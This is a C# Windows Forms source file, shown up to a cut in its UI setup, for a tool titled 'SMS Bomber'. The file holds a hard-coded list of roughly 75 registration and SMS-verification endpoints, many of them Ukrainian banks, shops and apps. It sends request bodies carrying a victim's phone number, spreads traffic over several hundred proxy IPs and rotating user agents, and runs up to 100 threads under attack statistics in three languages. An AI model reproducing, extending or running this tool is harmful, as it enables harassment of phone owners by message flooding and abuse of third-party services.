using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Threading;

namespace SMSBomber
{
    public partial class MainForm : Form
    {
        private readonly Random random = new Random();
        private int totalRequests = 0;
        private int successfulRequests = 0;
        private int failedRequests = 0;
        private bool isAttackRunning = false;
        private CancellationTokenSource cancellationTokenSource;
        private string currentLanguage = "ua";
        private Dictionary<string, Dictionary<string, string>> translations = new Dictionary<string, Dictionary<string, string>>();

        private readonly IReadOnlyList<string> userAgents = new List<string>
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
        };
        private List<string> proxyList = new List<string>
        {
            "192.73.244.36:80", "103.178.194.52:8080", "201.91.82.155:3128", "36.136.27.2:4999",
            "47.250.159.65:9080", "27.189.132.84:8089", "218.13.39.150:9091", "148.72.212.125:12041",
            "38.191.209.202:999", "34.87.84.105:80", "180.191.23.149:8082", "103.124.197.234:8080",
            "181.196.254.201:999", "218.77.183.214:5224", "157.245.95.247:443", "88.99.171.90:7003",
            "83.219.145.108:3128", "192.9.188.22:8008", "27.72.244.228:8080", "67.213.212.54:14098",
            "196.251.223.29:8104", "5.161.103.41:88", "89.46.249.253:53018", "103.157.117.61:8080",
            "49.84.175.94:8089", "8.211.138.60:3389", "91.241.48.225:35852", "200.174.198.86:8888",
            "103.172.249.234:3128", "112.64.134.154:1443", "189.61.199.170:37218", "51.91.109.83:80",
            "121.177.154.16:3033", "58.243.224.244:8085", "181.192.2.23:8080", "218.1.197.207:2324",
            "103.155.116.239:8080", "121.224.156.178:8089", "181.129.235.114:999", "113.23.155.110:1231",
            "199.229.254.129:4145", "171.244.140.160:31695", "106.38.26.22:2080", "45.95.203.1:8080",
            "185.162.251.147:8080", "45.95.203.2:8080", "45.95.203.3:8080", "45.95.203.4:8080",
            "45.95.203.5:8080", "45.95.203.6:8080", "45.95.203.7:8080", "45.95.203.8:8080",
            "45.95.203.9:8080", "45.95.203.10:8080", "185.162.251.148:8080", "185.162.251.149:8080",
            "185.162.251.150:8080", "185.162.251.151:8080", "185.162.251.152:8080", "185.162.251.153:8080",
            "185.162.251.154:8080", "185.162.251.155:8080", "185.162.251.156:8080", "185.162.251.157:8080",
            "185.162.251.158:8080", "185.162.251.159:8080", "185.162.251.160:8080", "185.162.251.161:8080",
            "185.162.251.162:8080", "185.162.251.163:8080", "185.162.251.164:8080", "185.162.251.165:8080",
            "185.162.251.166:8080", "185.162.251.167:8080", "185.162.251.168:8080", "185.162.251.169:8080",
            "185.162.251.170:8080", "185.162.251.171:8080", "185.162.251.172:8080", "185.162.251.173:8080",
            "185.162.251.174:8080", "185.162.251.175:8080", "185.162.251.176:8080", "185.162.251.177:8080",
            "185.162.251.178:8080", "185.162.251.179:8080", "185.162.251.180:8080", "185.162.251.181:8080",
            "185.162.251.182:8080", "185.162.251.183:8080", "185.162.251.184:8080", "185.162.251.185:8080",
            "185.162.251.186:8080", "185.162.251.187:8080", "185.162.251.188:8080", "185.162.251.189:8080",
            "185.162.251.190:8080", "185.162.251.191:8080", "185.162.251.192:8080", "185.162.251.193:8080",
            "185.162.251.194:8080", "185.162.251.195:8080", "185.162.251.196:8080", "185.162.251.197:8080",
            "185.162.251.198:8080", "185.162.251.199:8080", "185.162.251.200:8080", "45.95.203.11:8080",
            "45.95.203.12:8080", "45.95.203.13:8080", "45.95.203.14:8080", "45.95.203.15:8080",
            "45.95.203.16:8080", "45.95.203.17:8080", "45.95.203.18:8080", "45.95.203.19:8080",
            "45.95.203.20:8080", "45.95.203.21:8080", "45.95.203.22:8080", "45.95.203.23:8080",
            "45.95.203.24:8080", "45.95.203.25:8080", "45.95.203.26:8080", "45.95.203.27:8080",
            "45.95.203.28:8080", "45.95.203.29:8080", "45.95.203.30:8080", "45.95.203.31:8080",
            "45.95.203.32:8080", "45.95.203.33:8080", "45.95.203.34:8080", "45.95.203.35:8080",
            "45.95.203.36:8080", "45.95.203.37:8080", "45.95.203.38:8080", "45.95.203.39:8080",
            "45.95.203.40:8080", "45.95.203.41:8080", "45.95.203.42:8080", "45.95.203.43:8080",
            "45.95.203.44:8080", "45.95.203.45:8080", "45.95.203.46:8080", "45.95.203.47:8080",
            "45.95.203.48:8080", "45.95.203.49:8080", "45.95.203.50:8080", "103.83.36.5:8080",
            "103.83.36.6:8080", "103.83.36.7:8080", "103.83.36.8:8080", "103.83.36.9:8080",
            "103.83.36.10:8080", "103.83.36.11:8080", "103.83.36.12:8080", "103.83.36.13:8080",
            "103.83.36.14:8080", "103.83.36.15:8080", "103.83.36.16:8080", "103.83.36.17:8080",
            "103.83.36.18:8080", "103.83.36.19:8080", "103.83.36.20:8080", "103.83.36.21:8080",
            "103.83.36.22:8080", "103.83.36.23:8080", "103.83.36.24:8080", "103.83.36.25:8080",
            "103.83.36.26:8080", "103.83.36.27:8080", "103.83.36.28:8080", "103.83.36.29:8080",
            "103.83.36.30:8080", "103.83.36.31:8080", "103.83.36.32:8080", "103.83.36.33:8080",
            "103.83.36.34:8080", "103.83.36.35:8080", "103.83.36.36:8080", "103.83.36.37:8080",
            "103.83.36.38:8080", "103.83.36.39:8080", "103.83.36.40:8080", "103.83.36.41:8080",
            "103.83.36.42:8080", "103.83.36.43:8080", "103.83.36.44:8080", "103.83.36.45:8080",
            "103.83.36.46:8080", "103.83.36.47:8080", "103.83.36.48:8080", "103.83.36.49:8080",
            "103.83.36.50:8080", "103.83.36.51:8080", "103.83.36.52:8080", "103.83.36.53:8080",
            "103.83.36.54:8080", "103.83.36.55:8080", "103.83.36.56:8080", "103.83.36.57:8080",
            "103.83.36.58:8080", "103.83.36.59:8080", "103.83.36.60:8080", "103.83.36.61:8080",
            "103.83.36.62:8080", "103.83.36.63:8080", "103.83.36.64:8080", "103.83.36.65:8080",
            "103.83.36.66:8080", "103.83.36.67:8080", "103.83.36.68:8080", "103.83.36.69:8080",
            "103.83.36.70:8080", "103.83.36.71:8080", "103.83.36.72:8080", "103.83.36.73:8080",
            "103.83.36.74:8080", "103.83.36.75:8080", "103.83.36.76:8080", "103.83.36.77:8080",
            "103.83.36.78:8080", "103.83.36.79:8080", "103.83.36.80:8080", "103.83.36.81:8080",
            "103.83.36.82:8080", "103.83.36.83:8080", "103.83.36.84:8080", "103.83.36.85:8080",
            "103.83.36.86:8080", "103.83.36.87:8080", "103.83.36.88:8080", "103.83.36.89:8080",
            "103.83.36.90:8080", "103.83.36.91:8080", "103.83.36.92:8080", "103.83.36.93:8080",
            "103.83.36.94:8080", "103.83.36.95:8080", "103.83.36.96:8080", "103.83.36.97:8080",
            "103.83.36.98:8080", "103.83.36.99:8080", "103.83.36.100:8080"
        };
        private readonly List<ServiceTarget> serviceTargets = new List<ServiceTarget>();

        public MainForm()
        {
            InitializeServices();
            InitializeLanguages();
            InitializeComponent();
            InitializeCustomComponents();
            UpdateLanguage();
        }

        private void InitializeServices()
        {
            serviceTargets.Clear();
            serviceTargets.Add(new ServiceTarget("Helsi", "https://helsi.me/api/healthy/v2/accounts/send", "{\"phone\":\"{phone}\",\"platform\":\"PISWeb\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Rozetka", "https://xl-catalog-api.rozetka.com.ua/v2/registration/request", "{\"login\":\"{phone}\",\"registration_source\":\"web\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Novaposhta", "https://api.novaposhta.ua/v2.0/json/", "{\"apiKey\":\"\",\"modelName\":\"Counterparty\",\"calledMethod\":\"save\",\"methodProperties\":{\"FirstName\":\"Test\",\"Phone\":\"{phone}\"}}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("OLX", "https://www.olx.ua/api/open/oauth/token", "{\"phone\":\"{phone}\",\"scope\":\"read write\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Kasta", "https://kasta.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Allo", "https://allo.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Foxtrot", "https://www.foxtrot.com.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Comfy", "https://comfy.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Moyo", "https://www.moyo.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Citrus", "https://www.citrus.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Stylus", "https://stylus.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Brain", "https://brain.com.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Tehnoshok", "https://tehnoshok.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Hotline", "https://hotline.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Eldorado", "https://eldorado.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Monobank", "https://api.monobank.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("PrivatBank", "https://api.privatbank.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Raiffeisen", "https://api.raiffeisen.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("PUMB", "https://api.pumb.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Oschadbank", "https://api.oschadbank.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Ukrgasbank", "https://api.ukrgasbank.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("AlfaBank", "https://api.alfabank.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("CreditAgricole", "https://api.credit-agricole.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Uklon", "https://api.uklon.com.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Bolt", "https://api.bolt.eu/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Uber", "https://api.uber.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("OnTaxi", "https://api.ontaxi.com.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Glovo", "https://api.glovoapp.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Raketa", "https://api.raketa.delivery/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Dostavka", "https://api.dostavka.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Telegram", "https://my.telegram.org/auth/send_password", "phone=+{phone}", HttpMethod.Post, "application/x-www-form-urlencoded"));
            serviceTargets.Add(new ServiceTarget("Viber", "https://www.viber.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("WhatsApp", "https://web.whatsapp.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Instagram", "https://www.instagram.com/api/v1/accounts/send_signup_sms/", "phone_number=+{phone}", HttpMethod.Post, "application/x-www-form-urlencoded"));
            serviceTargets.Add(new ServiceTarget("Facebook", "https://www.facebook.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Twitter", "https://api.twitter.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("TikTok", "https://www.tiktok.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Steam", "https://store.steampowered.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Epic Games", "https://api.epicgames.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Wargaming", "https://api.wargaming.net/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("McDonalds", "https://api.mcdonalds.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("KFC", "https://api.kfc.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("BurgerKing", "https://api.burgerking.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Booking", "https://api.booking.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Airbnb", "https://api.airbnb.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Prometheus", "https://api.prometheus.org.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Coursera", "https://api.coursera.org/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Lun", "https://api.lun.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("DomRia", "https://api.domria.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Work", "https://api.work.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Rabota", "https://api.rabota.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Apteka", "https://api.apteka.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("3i", "https://api.3i.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("SportLife", "https://api.sportlife.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Anytime", "https://api.anytimefitness.ua/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Netflix", "https://api.netflix.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("MEGOGO", "https://api.megogo.net/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Amazon", "https://api.amazon.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("eBay", "https://api.ebay.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("AliExpress", "https://api.aliexpress.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("PayPal", "https://api.paypal.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Spotify", "https://api.spotify.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Zoom", "https://api.zoom.us/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Slack", "https://api.slack.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Reddit", "https://api.reddit.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("LinkedIn", "https://api.linkedin.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Pinterest", "https://api.pinterest.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Snapchat", "https://api.snapchat.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Discord", "https://discord.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Twitch", "https://api.twitch.tv/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Skype", "https://api.skype.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Microsoft", "https://api.microsoft.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Google", "https://api.google.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
            serviceTargets.Add(new ServiceTarget("Apple", "https://api.apple.com/api/auth/register", "{\"phone\":\"{phone}\"}", HttpMethod.Post));
        }

        private void InitializeLanguages()
        {
            translations["ua"] = new Dictionary<string, string>
            {
                {"title", "SMS BOMBER"},
                {"subtitle", "Сучасна версія | {0} сервісів | Висока швидкість"},
                {"attack_stats", "📊 СТАТИСТИКА АТАКИ"},
                {"successful", "✅ Успішних: {0}"},
                {"failed", "❌ Невдалих: {0}"},
                {"total", "📨 Всього: {0}"},
                {"success_rate", "📈 Ефективність: {0}%"},
                {"active_services", "🎯 Активних сервісів: {0}"},
                {"threads", "⚡ Потоків: {0}"},
                {"phone_number", "📱 НОМЕР ТЕЛЕФОНУ"},
                {"phone_format", "Формат: 0631244947"},
                {"start_attack", "🚀 ПОЧАТИ АТАКУ"},
                {"stop_attack", "⏹️ ЗУПИНИТИ"},
                {"status", "Статус: {0}"},
                {"proxy_management", "🔌 КЕРУВАННЯ ПРОКСІ"},
                {"active_proxies", "Активних: {0} проксі"},
                {"add_proxy", "➕ ДОДАТИ"},
                {"clear_all", "🗑️ ОЧИСТИТИ ВСІ"},
                {"load_from_file", "📁 ЗАВАНТАЖИТИ З ФАЙЛУ"},
                {"save_proxies", "💾 ЗБЕРЕГТИ ПРОКСІ"},
                {"proxy_placeholder", "IP:Port або user:pass@IP:Port"},
                {"service_selection", "🎯 ВИБІР СЕРВІСІВ ({0} доступно)"},
                {"select_all", "✅ ВИБРАТИ ВСІ"},
                {"deselect_all", "❌ СКАСУВАТИ ВСІ"},
                {"attack_log", "📝 ЛОГ АТАКИ"},
                {"clear_log", "🧹 ОЧИСТИТИ ЛОГ"},
                {"export_log", "💾 ЕКСПОРТУВАТИ ЛОГ"},
                {"speed", "⚡ ШВИДКІСТЬ"},
                {"slow", "🐢 Повільна (10 потоків)"},
                {"medium", "🚀 Середня (25 потоків)"},
                {"fast", "💨 Швидка (50 потоків)"},
                {"turbo", "🔥 Турбо (100 потоків)"},
                {"language", "🌐 МОВА"},
                {"attack_started", "Атака запущена"},
                {"attack_stopped", "Атака зупинена"},
                {"waiting", "Очікування запуску"},
                {"invalid_phone", "Невірний формат номеру!"},
                {"no_services", "Виберіть хоча б один сервіс!"},
                {"attack_started_log", "🚀 Атака розпочата на номер: +{0}"},
                {"services_selected_log", "🎯 Вибрано сервісів: {0}"},
                {"proxies_active_log", "🔌 Активних проксі: {0}"},
                {"speed_mode_log", "⚡ Режим швидкості: {0} потоків"},
                {"attack_stopped_log", "⏹️ Атака зупинена користувачем"},
                {"proxy_added", "Проксі додано: {0}"},
                {"proxy_exists", "Проксі вже існує: {0}"},
                {"proxies_cleared", "Всі проксі очищено"},
                {"proxies_loaded", "Завантажено {0} проксі з файлу"},
                {"proxies_saved", "Збережено {0} проксі у файл"},
                {"log_exported", "Лог успішно експортовано"},
                {"error_loading_proxies", "Помилка завантаження проксі: {0}"},
                {"error_saving_proxies", "Помилка збереження проксі: {0}"},
                {"error_exporting_log", "Помилка експорту логу: {0}"},
                {"invalid_proxy_format", "Невірний формат проксі: {0}"}
            };

            translations["en"] = new Dictionary<string, string>
            {
                {"title", "SMS BOMBER"},
                {"subtitle", "Modern Edition | {0} Services | High Speed"},
                {"attack_stats", "📊 ATTACK STATISTICS"},
                {"successful", "✅ Successful: {0}"},
                {"failed", "❌ Failed: {0}"},
                {"total", "📨 Total: {0}"},
                {"success_rate", "📈 Success Rate: {0}%"},
                {"active_services", "🎯 Active Services: {0}"},
                {"threads", "⚡ Threads: {0}"},
                {"phone_number", "📱 PHONE NUMBER"},
                {"phone_format", "Format: 0631244947"},
                {"start_attack", "🚀 START ATTACK"},
                {"stop_attack", "⏹️ STOP"},
                {"status", "Status: {0}"},
                {"proxy_management", "🔌 PROXY MANAGEMENT"},
                {"active_proxies", "Active: {0} proxies"},
                {"add_proxy", "➕ ADD"},
                {"clear_all", "🗑️ CLEAR ALL"},
                {"load_from_file", "📁 LOAD FROM FILE"},
                {"save_proxies", "💾 SAVE PROXIES"},
                {"proxy_placeholder", "IP:Port or user:pass@IP:Port"},
                {"service_selection", "🎯 SERVICE SELECTION ({0} available)"},
                {"select_all", "✅ SELECT ALL"},
                {"deselect_all", "❌ DESELECT ALL"},
                {"attack_log", "📝 ATTACK LOG"},
                {"clear_log", "🧹 CLEAR LOG"},
                {"export_log", "💾 EXPORT LOG"},
                {"speed", "⚡ SPEED"},
                {"slow", "🐢 Slow (10 threads)"},
                {"medium", "🚀 Medium (25 threads)"},
                {"fast", "💨 Fast (50 threads)"},
                {"turbo", "🔥 Turbo (100 threads)"},
                {"language", "🌐 LANGUAGE"},
                {"attack_started", "Attack Running"},
                {"attack_stopped", "Attack Stopped"},
                {"waiting", "Waiting for start"},
                {"invalid_phone", "Invalid phone number format!"},
                {"no_services", "Select at least one service!"},
                {"attack_started_log", "🚀 Attack started on: +{0}"},
                {"services_selected_log", "🎯 Selected services: {0}"},
                {"proxies_active_log", "🔌 Active proxies: {0}"},
                {"speed_mode_log", "⚡ Speed mode: {0} threads"},
                {"attack_stopped_log", "⏹️ Attack stopped by user"},
                {"proxy_added", "Proxy added: {0}"},
                {"proxy_exists", "Proxy already exists: {0}"},
                {"proxies_cleared", "All proxies cleared"},
                {"proxies_loaded", "Loaded {0} proxies from file"},
                {"proxies_saved", "Saved {0} proxies to file"},
                {"log_exported", "Log exported successfully"},
                {"error_loading_proxies", "Error loading proxies: {0}"},
                {"error_saving_proxies", "Error saving proxies: {0}"},
                {"error_exporting_log", "Error exporting log: {0}"},
                {"invalid_proxy_format", "Invalid proxy format: {0}"}
            };

            translations["ru"] = new Dictionary<string, string>
            {
                {"title", "SMS BOMBER"},
                {"subtitle", "Современная версия | {0} сервисов | Высокая скорость"},
                {"attack_stats", "📊 СТАТИСТИКА АТАКИ"},
                {"successful", "✅ Успешных: {0}"},
                {"failed", "❌ Неудачных: {0}"},
                {"total", "📨 Всего: {0}"},
                {"success_rate", "📈 Эффективность: {0}%"},
                {"active_services", "🎯 Активных сервисов: {0}"},
                {"threads", "⚡ Потоков: {0}"},
                {"phone_number", "📱 НОМЕР ТЕЛЕФОНА"},
                {"phone_format", "Формат: 0631244947"},
                {"start_attack", "🚀 НАЧАТЬ АТАКУ"},
                {"stop_attack", "⏹️ ОСТАНОВИТЬ"},
                {"status", "Статус: {0}"},
                {"proxy_management", "🔌 УПРАВЛЕНИЕ ПРОКСИ"},
                {"active_proxies", "Активных: {0} прокси"},
                {"add_proxy", "➕ ДОБАВИТЬ"},
                {"clear_all", "🗑️ ОЧИСТИТЬ ВСЕ"},
                {"load_from_file", "📁 ЗАГРУЗИТЬ ИЗ ФАЙЛА"},
                {"save_proxies", "💾 СОХРАНИТЬ ПРОКСИ"},
                {"proxy_placeholder", "IP:Port или user:pass@IP:Port"},
                {"service_selection", "🎯 ВЫБОР СЕРВИСОВ ({0} доступно)"},
                {"select_all", "✅ ВЫБРАТЬ ВСЕ"},
                {"deselect_all", "❌ ОТМЕНИТЬ ВСЕ"},
                {"attack_log", "📝 ЛОГ АТАКИ"},
                {"clear_log", "🧹 ОЧИСТИТЬ ЛОГ"},
                {"export_log", "💾 ЭКСПОРТИРОВАТЬ ЛОГ"},
                {"speed", "⚡ СКОРОСТЬ"},
                {"slow", "🐢 Медленная (10 потоков)"},
                {"medium", "🚀 Средняя (25 потоков)"},
                {"fast", "💨 Быстрая (50 потоков)"},
                {"turbo", "🔥 Турбо (100 потоков)"},
                {"language", "🌐 ЯЗЫК"},
                {"attack_started", "Атака запущена"},
                {"attack_stopped", "Атака остановлена"},
                {"waiting", "Ожидание запуска"},
                {"invalid_phone", "Неверный формат номера!"},
                {"no_services", "Выберите хотя бы один сервис!"},
                {"attack_started_log", "🚀 Атака начата на номер: +{0}"},
                {"services_selected_log", "🎯 Выбрано сервисов: {0}"},
                {"proxies_active_log", "🔌 Активных прокси: {0}"},
                {"speed_mode_log", "⚡ Режим скорости: {0} потоков"},
                {"attack_stopped_log", "⏹️ Атака остановлена пользователем"},
                {"proxy_added", "Прокси добавлен: {0}"},
                {"proxy_exists", "Прокси уже существует: {0}"},
                {"proxies_cleared", "Все прокси очищены"},
                {"proxies_loaded", "Загружено {0} прокси из файла"},
                {"proxies_saved", "Сохранено {0} прокси в файл"},
                {"log_exported", "Лог успешно экспортирован"},
                {"error_loading_proxies", "Ошибка загрузки прокси: {0}"},
                {"error_saving_proxies", "Ошибка сохранения прокси: {0}"},
                {"error_exporting_log", "Ошибка экспорта лога: {0}"},
                {"invalid_proxy_format", "Неверный формат прокси: {0}"}
            };
        }

        private string T(string key, params object[] args)
        {
            if (translations.ContainsKey(currentLanguage) && translations[currentLanguage].ContainsKey(key))
            {
                return string.Format(translations[currentLanguage][key], args);
            }
            return key;
        }

        private void UpdateLanguage()
        {
            UpdateControlText(this);
            UpdateProxyCount();
            UpdateServicesCount();
        
            var speedComboBox = Controls.Find("cmbSpeed", true).FirstOrDefault() as ComboBox;
            if (speedComboBox != null)
            {
                int selectedIndex = speedComboBox.SelectedIndex;
                speedComboBox.Items.Clear();
                speedComboBox.Items.AddRange(new object[] { 
                    T("slow"), T("medium"), T("fast"), T("turbo")
                });
                speedComboBox.SelectedIndex = selectedIndex >= 0 ? selectedIndex : 2;
            }
        }

        private void UpdateControlText(Control control)
        {
            foreach (Control ctrl in control.Controls)
            {
                if (ctrl is Label label && label.Tag != null)
                {
                    string tag = label.Tag.ToString();
                    if (tag.StartsWith("T:"))
                    {
                        string key = tag.Substring(2);
                        label.Text = T(key);
                    }
                    else if (tag.StartsWith("Tf:"))
                    {
                        string key = tag.Substring(3);
                        string[] parts = key.Split('|');
                        if (parts.Length == 2)
                        {
                            label.Text = T(parts[0], parts[1]);
                        }
                    }
                }
                else if (ctrl is Button button && button.Tag != null)
                {
                    string tag = button.Tag.ToString();
                    if (tag.StartsWith("T:"))
                    {
                        string key = tag.Substring(2);
                        button.Text = T(key);
                    }
                }
                else if (ctrl is ComboBox combo && combo.Tag != null && combo.Tag.ToString() == "language")
                {
                    combo.SelectedItem = currentLanguage.ToUpper();
                }

                if (ctrl.HasChildren)
                {
                    UpdateControlText(ctrl);
                }
            }
        }

        private void InitializeCustomComponents()
        {
            this.BackColor = Color.Black;
            this.ForeColor = Color.White;
            this.Size = new Size(1200, 800);
            this.Text = "SMS Bomber | envy0xc0";

            InitializeHeader();
            InitializeStatsPanel();
            InitializeControlsPanel();
            InitializeProxyPanel();
            InitializeServicesPanel();
            InitializeLogPanel();
        }

        private void InitializeHeader()
        {
            var headerPanel = new Panel
            {
                Location = new Point(0, 0),
                Size = new Size(1200, 80),
                BackColor = Color.Black,
                BorderStyle = BorderStyle.FixedSingle
            };

            var titleLabel = new Label
            {
                Text = T("title"),
                Location = new Point(20, 20),
                Size = new Size(400, 40),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 20, FontStyle.Bold),
                BackColor = Color.Transparent,
                Tag = "T:title"
            };

            var subtitleLabel = new Label
            {
                Text = T("subtitle", serviceTargets.Count),
                Location = new Point(20, 55),
